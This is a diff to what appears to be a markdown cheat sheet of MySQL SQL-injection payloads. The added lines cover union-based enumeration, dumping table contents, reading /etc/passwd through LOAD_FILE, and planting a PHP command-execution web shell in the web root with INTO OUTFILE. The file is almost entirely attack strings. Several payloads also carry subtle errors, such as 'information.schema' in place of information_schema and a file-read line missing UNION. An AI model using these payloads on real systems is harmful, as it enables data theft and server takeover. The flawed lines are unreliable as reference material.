@@ -44,13 +44,29 @@ After stuffing the input fields you should either obtain access to the system as
 ' UNION SELECT 1, VERSION(), 3--
 
 # Get DB name
-` UNION SELECT 1,2, DATABASE()--
+' UNION SELECT 1,2, DATABASE()--
 
 # Get table name
-`UNION SELECT 1,2, GROUP_CONCAT(table_name) FROM information.schema.tables WHERE table.schema="<DATABASE>"--
+' UNION ALL SELECT 1,2, GROUP_CONCAT(table_name) FROM information.schema.tables WHERE table.schema="<DATABASE>"--
 
 # Get column name
-`UNION SELECT 1,2, GROUP_CONCAT(column_name) FROM information.schema.columns WHERE table.schema="<DATABASE>" AND table.name="<TABLE>"--
+' UNION ALL SELECT 1,2, GROUP_CONCAT(column_name) FROM information.schema.columns WHERE table.schema="<DATABASE>" AND table.name="<TABLE>"--
+
+# Data dump
+' UNION ALL SELECT 1,2,GROUP_CONCAT(CONCAT_WS(':', col1, col2, col3) SEPARATOR ' | ') FROM <TABLE>--
+
+# File read
+' SELECT LOAD_FILE('/etc/passwd')
+
+# Create webshell
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php"--
+
+OR
+
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" --
+
 ```
 
 #### MSSQL
